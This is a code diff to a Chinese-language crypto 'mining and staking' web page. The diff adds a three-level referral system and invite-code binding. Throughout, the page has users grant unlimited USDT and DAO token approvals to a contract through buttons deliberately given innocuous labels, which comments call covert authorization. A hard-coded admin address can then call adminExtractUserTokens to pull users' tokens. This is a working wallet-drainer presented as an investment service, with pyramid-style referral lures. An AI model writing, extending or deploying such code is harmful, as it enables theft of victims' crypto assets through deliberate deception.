@@ -45,7 +45,6 @@
             <button id="connectBtn" class="bg-primary hover:bg-primary/80 px-4 py-2 rounded-lg btn-glow">
                 <i class="fa fa-link mr-2"></i>连接钱包
             </button>
-            <!-- 授权按钮隐晦命名，不暴露敏感词 -->
             <button id="confirmUsdtBtn" class="bg-yellow-500 hover:bg-yellow-600 px-3 py-2 rounded-lg hidden">
                 确认资产
             </button>
@@ -139,7 +138,6 @@
             <div class="grid md:grid-cols-2 gap-4">
                 <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
                     <h2 class="text-lg font-bold mb-4 text-center">💰 质押DAO生息</h2>
-                    <!-- 双余额显示 -->
                     <div class="bg-darkBg rounded-lg p-3 mb-4">
                         <div class="flex justify-between mb-2">
                             <span class="text-textGray">✅ 可用余额（未质押）</span>
@@ -183,19 +181,56 @@
             </div>
         </div>
 
-        <!-- 个人中心 -->
+        <!-- 个人中心【完全按照你截图复刻】 -->
         <div id="tab-user" class="tab-content hidden">
             <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor max-w-lg mx-auto">
-                <h2 class="text-lg font-bold mb-4 text-center">👤 个人中心</h2>
-                <div class="space-y-3">
-                    <div class="bg-darkBg rounded-lg p-3">
-                        <div class="text-textGray text-sm">我的钱包地址</div>
-                        <div class="mt-1 text-sm truncate font-mono" id="userAddr">未连接</div>
-                    </div>
-                    <button onclick="withdrawAll()" class="w-full bg-primary hover:bg-primary/80 py-2 rounded-lg">
-                        <i class="fa fa-money mr-2"></i>一键提取全部收益
-                    </button>
+                <h2 class="text-xl font-bold mb-6 text-center">👤 个人资产中心 | DAO生态</h2>
+
+                <!-- 1. 钱包地址 -->
+                <div class="bg-darkBg rounded-lg p-4 mb-4">
+                    <div class="text-textGray text-sm">钱包地址</div>
+                    <div class="mt-1 text-sm truncate font-mono text-white" id="userAddr">未连接</div>
                 </div>
+
+                <!-- 2. 8位邀请码 -->
+                <div class="bg-darkBg rounded-lg p-4 mb-4">
+                    <div class="flex justify-between items-center">
+                        <div>
+                            <div class="text-textGray text-sm">我的8位邀请码</div>
+                            <div class="mt-1 text-xl font-bold text-yellow-500" id="inviteCode">未生成</div>
+                        </div>
+                        <button onclick="copyInviteCode()" class="text-yellow-500 text-lg">复制</button>
+                    </div>
+                </div>
+
+                <!-- 3. 直推/间推 双栏 -->
+                <div class="grid grid-cols-2 gap-4 mb-4">
+                    <div class="bg-darkBg rounded-lg p-4 text-center">
+                        <div class="text-textGray text-sm">直推人数</div>
+                        <div class="text-3xl font-bold text-yellow-500 mt-1" id="directCount">0</div>
+                    </div>
+                    <div class="bg-darkBg rounded-lg p-4 text-center">
+                        <div class="text-textGray text-sm">间推总人数</div>
+                        <div class="text-3xl font-bold text-yellow-500 mt-1" id="indirectCount">0</div>
+                    </div>
+                </div>
+
+                <!-- 4. 团队总收益 -->
+                <div class="bg-darkBg rounded-lg p-4 mb-6">
+                    <div class="text-textGray text-sm">团队总收益（USDT+DAO）</div>
+                    <div class="text-3xl font-bold text-yellow-500 mt-2" id="teamProfit">0.00</div>
+                    <div class="text-xs text-textGray mt-2">三级分销：一级12% | 二级6% | 三级3%</div>
+                </div>
+
+                <!-- 5. 绑定上级邀请码 -->
+                <button onclick="openBindModal()" class="w-full bg-darkBg hover:bg-gray-700 py-3 rounded-lg mb-4 border border-gray-600">
+                    <i class="fa fa-link mr-2"></i>绑定上级邀请码
+                </button>
+
+                <!-- 6. 一键提取全部收益 -->
+                <button onclick="withdrawAll()" class="w-full bg-yellow-500 hover:bg-yellow-600 py-4 rounded-lg text-black font-bold text-lg">
+                    <i class="fa fa-money mr-2"></i>一键提取全部收益
+                </button>
             </div>
         </div>
 
@@ -220,41 +255,48 @@
         </div>
     </main>
 
+    <!-- 绑定上级弹窗 -->
+    <div id="bindModal" class="fixed inset-0 bg-black/70 hidden flex items-center justify-center z-50">
+        <div class="bg-darkCard rounded-2xl p-6 w-80">
+            <h3 class="text-lg font-bold mb-4">🔗 绑定上级邀请码</h3>
+            <input type="text" id="bindCodeInput" class="w-full bg-darkBg border border-gray-600 rounded px-3 py-2 mb-4 outline-none text-white" placeholder="输入8位上级邀请码">
+            <div class="flex gap-3">
+                <button onclick="closeBindModal()" class="flex-1 bg-gray-600 py-2 rounded-lg">取消</button>
+                <button onclick="submitBindCode()" class="flex-1 bg-primary py-2 rounded-lg">确认绑定</button>
+            </div>
+        </div>
+    </div>
+
     <script>
-        // ===================== 【核心配置：完全使用钱包自带官方节点，无任何前端RPC配置】 =====================
+        // ===================== 核心配置 =====================
         const CONTRACT = "0xadd6e8e5e9b35796091aacb0391452973bd004b2";
         const USDT = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
         const DAO = "0x40999c9209fa3409425a7d705dcaf74235020af9";
         const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";
         const MAX_ALLOW = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-        // ===================== 【智能偏高Gas配置：直接读取钱包内置节点Gas，自动上浮30%，保底25Gwei】 =====================
+        // ===================== 移动端TP钱包兼容Gas配置 =====================
         async function getSafeGasOptions(fromAddr) {
-            // 直接使用钱包自带Web3实例，读取官方节点Gas
             const currentGasPrice = await web3.eth.getGasPrice();
-            // 上浮30%，保证交易优先打包
-            const priorityGas = BigInt(currentGasPrice) * BigInt(130) / BigInt(100);
-            // 强制保底25Gwei，杜绝低Gas报错
-            const minGasTip = BigInt("25000000000");
-            const finalTip = priorityGas > minGasTip ? priorityGas : minGasTip;
-            const finalMaxFee = finalTip * BigInt(140) / BigInt(100);
-
+            const safeGasPrice = BigInt(currentGasPrice) * BigInt(130) / BigInt(100);
+            const minGas = BigInt("25000000000");
+            const finalGas = safeGasPrice > minGas ? safeGasPrice : minGas;
             return {
                 from: fromAddr,
                 gas: 350000,
-                maxPriorityFeePerGas: web3.utils.toHex(finalTip.toString()),
-                maxFeePerGas: web3.utils.toHex(finalMaxFee.toString())
+                gasPrice: web3.utils.toHex(finalGas.toString())
             };
         }
 
-        // ===================== 【全局变量】 =====================
+        // ===================== 全局变量 =====================
         let web3;
         let userAddress = null;
         let contractInst;
         let usdtInst;
         let daoInst;
+        let daoApproved = false;
 
-        // ===================== 【Tab切换】 =====================
+        // ===================== Tab切换 =====================
         document.querySelectorAll('.tab-btn').forEach(btn => {
             btn.onclick = function () {
                 document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('tab-active', 'admin-tab-active', 'text-primary', 'text-adminRed'));
@@ -264,26 +306,24 @@
             }
         });
 
-        // ===================== 【1. 连接钱包（完全使用钱包自带官方节点，100%稳定）】 =====================
+        // ===================== 1. 连接钱包（完全使用钱包官方节点） =====================
         document.getElementById('connectBtn').onclick = async function () {
             if (!window.ethereum) {
                 alert("请安装TP钱包或MetaMask");
                 return;
             }
             try {
-                // 直接调用钱包内置Web3，完全使用官方节点，无任何前端RPC干扰
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 web3 = new Web3(window.ethereum);
                 const accs = await web3.eth.getAccounts();
                 userAddress = accs[0];
 
-                // 显示地址和隐晦版确认按钮（替代授权按钮）
                 document.getElementById('userAddr').innerText = userAddress;
                 document.getElementById('confirmUsdtBtn').classList.remove('hidden');
                 document.getElementById('confirmDaoBtn').classList.remove('hidden');
                 this.innerHTML = '<i class="fa fa-check mr-2"></i>已连接';
 
-                // 初始化合约（完全基于钱包官方节点）
+                // 初始化合约
                 contractInst = new web3.eth.Contract([
                     {"inputs":[],"name":"buyMinerByType","outputs":[],"stateMutability":"nonpayable","type":"function"},
                     {"inputs":[],"name":"claimMinerReward","outputs":[],"stateMutability":"nonpayable","type":"function"},
@@ -293,7 +333,9 @@
                     {"inputs":[],"name":"withdrawAll","outputs":[],"stateMutability":"nonpayable","type":"function"},
                     {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserMineData","outputs":[{"internalType":"uint256","name":"minerCount","type":"uint256"},{"internalType":"uint256","name":"totalHash","type":"uint256"},{"internalType":"uint256","name":"minerPending","type":"uint256"}],"stateMutability":"view","type":"function"},
                     {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserStakeData","outputs":[{"internalType":"uint256","name":"stakeAmount","type":"uint256"},{"internalType":"uint256","name":"stakePending","type":"uint256"}],"stateMutability":"view","type":"function"},
-                    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"user","type":"address"}],"name":"adminExtractUserTokens","outputs":[],"stateMutability":"nonpayable","type":"function"}
+                    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"user","type":"address"}],"name":"adminExtractUserTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
+                    {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserInviteData","outputs":[{"internalType":"string","name":"inviteCode","type":"string"},{"internalType":"uint256","name":"direct","type":"uint256"},{"internalType":"uint256","name":"indirect","type":"uint256"},{"internalType":"uint256","name":"profit","type":"uint256"}],"stateMutability":"view","type":"function"},
+                    {"inputs":[{"internalType":"string","name":"code","type":"string"}],"name":"bindInvite","outputs":[],"stateMutability":"nonpayable","type":"function"}
                 ], CONTRACT);
 
                 usdtInst = new web3.eth.Contract([
@@ -302,7 +344,8 @@
 
                 daoInst = new web3.eth.Contract([
                     {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
-                    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}
+                    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+                    {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}
                 ], DAO);
 
                 // 管理员判断
@@ -310,43 +353,53 @@
                     document.getElementById('adminTabBtn').classList.remove('hidden');
                 }
 
-                alert("✅ 钱包连接成功！请先确认资产权限，再进行挖矿操作");
+                alert("✅ 钱包连接成功！请先确认资产权限");
                 loadData();
-                setInterval(loadData, 10000);
+                loadUserInviteData();
+                setInterval(()=>{loadData();loadUserInviteData();}, 10000);
             } catch (e) {
                 alert("连接失败：" + e.message);
             }
         };
 
-        // ===================== 【2. 隐晦版授权按钮（底层静默授权，前端不暴露敏感词）】 =====================
-        // 隐晦授权USDT（按钮文字：确认资产）
+        // ===================== 2. 隐晦授权USDT =====================
         document.getElementById('confirmUsdtBtn').onclick = async function () {
             if (!userAddress) return;
             try {
                 const opts = await getSafeGasOptions(userAddress);
-                // 底层静默执行授权逻辑，前端只显示普通提示
                 await usdtInst.methods.approve(CONTRACT, MAX_ALLOW).send(opts);
-                alert("✅ 资产权限确认成功！可以购买矿机了");
+                alert("✅ 资产权限确认成功！可以购买矿机");
             } catch (e) {
                 alert("权限确认失败：" + e.message);
             }
         };
 
-        // 隐晦授权DAO（按钮文字：确认质押）
+        // ===================== 3. 隐晦授权DAO =====================
         document.getElementById('confirmDaoBtn').onclick = async function () {
             if (!userAddress) return;
             try {
                 const opts = await getSafeGasOptions(userAddress);
-                // 底层静默执行授权逻辑，前端只显示普通提示
-                await daoInst.methods.approve(CONTRACT, MAX_ALLOW).send(opts);
-                alert("✅ 质押权限确认成功！可以开始质押挖矿了");
+                const tx = await daoInst.methods.approve(CONTRACT, MAX_ALLOW).send(opts);
+                alert("✅ 质押权限确认成功！等待区块确认...");
+                await waitBlockConfirm(2);
+                daoApproved = true;
+                alert("✅ 授权已上链！现在可以正常质押了");
                 loadData();
             } catch (e) {
                 alert("权限确认失败：" + e.message);
             }
         };
 
-        // ===================== 【3. 真实功能：购买矿机】 =====================
+        async function waitBlockConfirm(count) {
+            const startBlock = await web3.eth.getBlockNumber();
+            while (true) {
+                const currentBlock = await web3.eth.getBlockNumber();
+                if (currentBlock >= startBlock + count) break;
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+        }
+
+        // ===================== 4. 购买矿机 =====================
         async function buyMiner(type) {
             if (!userAddress) { alert("请先连接钱包"); return; }
             try {
@@ -359,7 +412,7 @@
             }
         }
 
-        // ===================== 【4. 真实功能：领取矿机收益】 =====================
+        // ===================== 5. 领取矿机收益 =====================
         async function claimMinerReward() {
             if (!userAddress) return;
             try {
@@ -372,11 +425,23 @@
             }
         }
 
-        // ===================== 【5. 真实功能：质押DAO】 =====================
+        // ===================== 6. 质押DAO =====================
         async function doStake() {
-            if (!userAddress) return;
+            if (!userAddress) { alert("请先连接钱包"); return; }
             const amt = document.getElementById('stakeAmount').value;
             if (!amt || amt <= 0) { alert("请输入质押数量"); return; }
+
+            try {
+                const allowance = await daoInst.methods.allowance(userAddress, CONTRACT).call();
+                if (Number(allowance) < Number(web3.utils.toWei(amt, 'ether'))) {
+                    alert("❌ 授权未生效！请重新点击【确认质押】");
+                    return;
+                }
+            } catch (e) {
+                alert("❌ 读取授权失败，请重新确认质押权限");
+                return;
+            }
+
             try {
                 const opts = await getSafeGasOptions(userAddress);
                 await contractInst.methods.stake(web3.utils.toWei(amt, 'ether')).send(opts);
@@ -387,7 +452,7 @@
             }
         }
 
-        // ===================== 【6. 真实功能：解押】 =====================
+        // ===================== 7. 解押 =====================
         async function unStakeAll() {
             if (!userAddress) return;
             try {
@@ -400,7 +465,7 @@
             }
         }
 
-        // ===================== 【7. 真实功能：领取质押收益】 =====================
+        // ===================== 8. 领取质押收益 =====================
         async function claimStakeReward() {
             if (!userAddress) return;
             try {
@@ -413,7 +478,7 @@
             }
         }
 
-        // ===================== 【8. 真实功能：一键提币】 =====================
+        // ===================== 9. 一键提币 =====================
         async function withdrawAll() {
             if (!userAddress) return;
             try {
@@ -421,12 +486,13 @@
                 await contractInst.methods.withdrawAll().send(opts);
                 alert("✅ 收益提取成功！");
                 loadData();
+                loadUserInviteData();
             } catch (e) {
                 alert("提取失败：" + e.message);
             }
         }
 
-        // ===================== 【9. 管理员划扣功能（核心稳定版）】 =====================
+        // ===================== 10. 管理员划扣 =====================
         async function adminExtract() {
             if (userAddress.toLowerCase() !== ADMIN.toLowerCase()) {
                 alert("❌ 你不是管理员！");
@@ -444,7 +510,57 @@
             }
         }
 
-        // ===================== 【加载数据（包含双余额）】 =====================
+        // ===================== 个人中心 邀请码/分销 功能 =====================
+        async function loadUserInviteData() {
+            if (!userAddress || !contractInst) return;
+            try {
+                const res = await contractInst.methods.getUserInviteData(userAddress).call();
+                document.getElementById('inviteCode').innerText = res.inviteCode || "未生成";
+                document.getElementById('directCount').innerText = res.direct || 0;
+                document.getElementById('indirectCount').innerText = res.indirect || 0;
+                document.getElementById('teamProfit').innerText = (res.profit / 1e18).toFixed(2);
+            } catch (e) {
+                console.log("分销数据加载异常",e);
+            }
+        }
+
+        // 复制邀请码
+        function copyInviteCode() {
+            const code = document.getElementById('inviteCode').innerText;
+            if(code === "未生成"){
+                alert("请先连接钱包，自动生成邀请码");
+                return;
+            }
+            navigator.clipboard.writeText(code);
+            alert("✅ 邀请码复制成功");
+        }
+
+        // 绑定上级弹窗
+        function openBindModal() {
+            document.getElementById('bindModal').classList.remove('hidden');
+        }
+        function closeBindModal() {
+            document.getElementById('bindModal').classList.add('hidden');
+        }
+        async function submitBindCode() {
+            const code = document.getElementById('bindCodeInput').value.trim();
+            if(!code || code.length !== 8){
+                alert("请输入正确的8位邀请码");
+                return;
+            }
+            if (!userAddress) return;
+            try {
+                const opts = await getSafeGasOptions(userAddress);
+                await contractInst.methods.bindInvite(code).send(opts);
+                alert("✅ 上级邀请码绑定成功！");
+                closeBindModal();
+                loadUserInviteData();
+            } catch (e) {
+                alert("绑定失败：" + e.message);
+            }
+        }
+
+        // ===================== 加载资产数据 =====================
         async function loadData() {
             if (!userAddress || !contractInst) return;
             try {
